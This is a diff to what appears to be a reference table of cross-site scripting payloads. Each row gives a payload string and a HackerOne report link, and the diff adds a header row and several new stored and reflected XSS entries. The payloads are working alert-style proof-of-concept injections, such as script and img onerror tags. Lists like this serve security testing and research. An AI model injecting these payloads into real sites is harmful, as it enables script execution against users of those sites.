@@ -1,5 +1,11 @@
-1234<img+src+onerror%3d'alert(1)'>|https://hackerone.com/reports/450315
-%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E| https://hackerone.com/reports/708592
-FA_CERT%27%20onmouseover=alert(1)%20%27%22&|https://hackerone.com/reports/648305
-%22%3E%3Cimage/src=%22//|https://hackerone.com/reports/198218
---><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS|https://hackerone.com/reports/376027
+Payload|XSS Type|URL
+1234<img+src+onerror%3d'alert(1)'>||https://hackerone.com/reports/450315
+%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E|| https://hackerone.com/reports/708592
+FA_CERT%27%20onmouseover=alert(1)%20%27%22&||https://hackerone.com/reports/648305
+%22%3E%3Cimage/src=%22//||https://hackerone.com/reports/198218
+--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS||https://hackerone.com/reports/376027
+<script>alert(document.cookie)</script>||https://hackerone.com/reports/192940
+"'><img src=x onerror=alert(1)>|Stored XSS|https://hackerone.com/reports/729424
+ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E|Reflected XSS|https://hackerone.com/reports/531042
+ </script><svg/onload=alert()>|Reflected XSS|https://hackerone.com/reports/531042
+ 
